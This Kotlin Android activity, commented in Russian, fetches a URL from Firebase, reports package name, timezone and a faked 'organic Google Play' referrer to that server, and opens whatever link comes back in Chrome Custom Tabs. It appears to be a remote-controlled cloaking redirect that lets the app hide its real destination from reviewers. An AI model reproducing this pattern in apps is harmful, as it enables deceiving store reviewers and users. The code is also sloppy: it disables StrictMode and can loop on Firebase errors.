package com.template

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.*
import android.os.StrictMode.ThreadPolicy
import android.webkit.WebView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabColorSchemeParams
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.URL
import java.util.*
import javax.net.ssl.HttpsURLConnection


class LoadingActivity : AppCompatActivity() {
    private lateinit var prefLinkFirebase: SharedPreferences
    private lateinit var prefCheckRequest: SharedPreferences
    private lateinit var prefLinkFromServer: SharedPreferences
    private lateinit var prefURLtoOpenInTabs: SharedPreferences
    private lateinit var db: DatabaseReference
    private lateinit var userAgent : String
    private lateinit var firebaseAnalytics: FirebaseAnalytics

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading2)

        db = Firebase.database.reference
        firebaseAnalytics = Firebase.analytics

        askNotificationPermission()

        prefLinkFirebase = getSharedPreferences("linkFirebase", MODE_PRIVATE)
        prefCheckRequest = getSharedPreferences("requestWasSend", MODE_PRIVATE)
        prefLinkFromServer = getSharedPreferences("isResponse", MODE_PRIVATE)
        prefURLtoOpenInTabs = getSharedPreferences("URL", MODE_PRIVATE)

        userAgent = WebView(this@LoadingActivity).settings.userAgentString
        val timeZone = TimeZone.getDefault().toString().substringAfter("id=\"").substringBefore('"')

        val policy = ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)

        //Проверка подключения к сети
        if(isConnected) {
            //Проверка был ли запрос к серверу завершен ошибкой
            if(prefLinkFromServer.getString("isResponse", "").toString()!="Error"){
            //Проверка получнена ли URL ссылка для ChromeTabs при первом запуске приложения
             if (prefLinkFromServer.getString("isResponse", "").toString() == "") {
                 //Toast.makeText(this@LoadingActivity, "Open URL for the first time", Toast.LENGTH_SHORT).show()
                //Проверяем был ли уже запрос к Firebase RDB
                if (prefCheckRequest.getBoolean("requestWasSend", false) == false) {
                    //Работа с БД в отдельном потоке. Для быстрого обмена переменными все сделано последовательно
                    CoroutineScope(Dispatchers.IO).launch {
                        var stop = false
                        db.child("db").child("link").get().addOnCompleteListener { task ->
                            //Объявляем цикл для удобного выхода из него
                            while (!stop)
                                if (task.isSuccessful) {
                                    //Проверяем сслыку из Firebase
                                    if (task.result.value.toString() == "") {
                                        finish()
                                        break
                                    }
                                    //сохраняем результат
                                    val editPrefLinkFirebase: SharedPreferences.Editor =
                                        prefLinkFirebase.edit()
                                    val editPrefCheckRequest: SharedPreferences.Editor =
                                        prefCheckRequest.edit()
                                    editPrefLinkFirebase.putString(
                                        "linkFirebase",
                                        task.result.value.toString()
                                    )
                                    editPrefCheckRequest.putBoolean("requestWasSend", false)
                                    editPrefLinkFirebase.commit()
                                    editPrefCheckRequest.commit()

                                    //Формируем ссылку
                                    val editPrefURLtoOpenInTabs: SharedPreferences.Editor =
                                        prefURLtoOpenInTabs.edit()
                                    editPrefURLtoOpenInTabs.putString(
                                        "URL", task.result.value.toString() +
                                                "/?" +
                                                "packageid=$packageName" +
                                                "&usserid=${UUID.randomUUID()}" +
                                                "&getz=$timeZone" +
                                                "&getr=utm_source=google-play&utm_medium=organic"
                                    )
                                    editPrefURLtoOpenInTabs.commit()
                                    //отправляем запрос на сервер в заголовок добавляем user-agent
                                    try {
                                        val url = URL(prefURLtoOpenInTabs.getString("URL", ""))
                                        val connection: HttpsURLConnection =
                                            url.openConnection() as HttpsURLConnection
                                        connection.setRequestProperty("User-Agent", userAgent)

                                        val br =
                                            BufferedReader(InputStreamReader(connection.inputStream))
                                        val line: String = br.readLine()

                                        //Сохраняем полученную ссылку
                                        val editPrefLinkFromServer: SharedPreferences.Editor =
                                            prefLinkFromServer.edit()
                                        editPrefLinkFromServer.putString("isResponse", line.toString())
                                        editPrefLinkFromServer.commit()
                                        connection.disconnect()
                                    } catch (e: Exception) {
                                        //если ошибка- выходим в main_activity и запоминаем получение ошибки
                                        val editPrefLinkFromServer: SharedPreferences.Editor =
                                            prefLinkFromServer.edit()
                                        editPrefLinkFromServer.putString("isResponse","Error" )
                                        editPrefLinkFromServer.commit()
                                        finish()
                                        break
                                    }
                                    //Открываем полученную ссылку в chrometabs
                                    openTabs(
                                        prefLinkFromServer.getString("isResponse", "").toString()
                                    )
                                    //завершаем цикл
                                    break
                                } else {
                                    //Ошибка при работе с Firebase
                                    Toast.makeText(
                                        this@LoadingActivity,
                                        "ERROR FIREBASE ",
                                        Toast.LENGTH_SHORT
                                    ).show()
                                }
                        }
                    }
                }
                } else
                    {
                        //Проверка получнена ли URL ссылка для ChromeTabs при первом запуске приложения
                        //Toast.makeText(this@LoadingActivity, "Open URL not for the first time", Toast.LENGTH_SHORT).show()
                        openTabs(prefLinkFromServer.getString("isResponse", "").toString())

                    }
            } else
                {
                    //Проверка был ли запрос к серверу завершен ошибкой
                    //Toast.makeText(this@LoadingActivity, "Error to connect Server", Toast.LENGTH_SHORT).show()
                    finish()
                }
        } else
            {
                //Проверка подключения к сети
            Toast.makeText(this@LoadingActivity, "Check Internet connection", Toast.LENGTH_SHORT).show()
            finish()
            }
    }

    // Проверяем интернет
    val Context.isConnected: Boolean
        get() {
            return (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .activeNetworkInfo?.isConnected == true
        }

    // Запрос разрешения на показ уведомлений
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { isGranted: Boolean ->
        if (isGranted) {
            //  Toast.makeText(this, "Thanks!", Toast.LENGTH_SHORT).show()
        } else {
            //  Toast.makeText(this, ":(", Toast.LENGTH_SHORT).show()
        }
    }

    // Запрос разрешения на показ уведомлений
    private fun askNotificationPermission() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) ==
                PackageManager.PERMISSION_GRANTED
            )
            else {
                requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    //открываем ссылку в ChromeCustomTabs
    @SuppressLint("ResourceAsColor")
    private fun openTabs(url: String){
        val intent: CustomTabsIntent = CustomTabsIntent.Builder()
            .setDefaultColorSchemeParams(
                CustomTabColorSchemeParams.Builder()
                .setToolbarColor(R.color.black)
                .build())
            .setColorSchemeParams(CustomTabsIntent.COLOR_SCHEME_DARK, CustomTabColorSchemeParams.Builder()
                .setToolbarColor(R.color.black)
                .build())
            .build()
        intent.launchUrl(this@LoadingActivity, Uri.parse(url))
    }
}
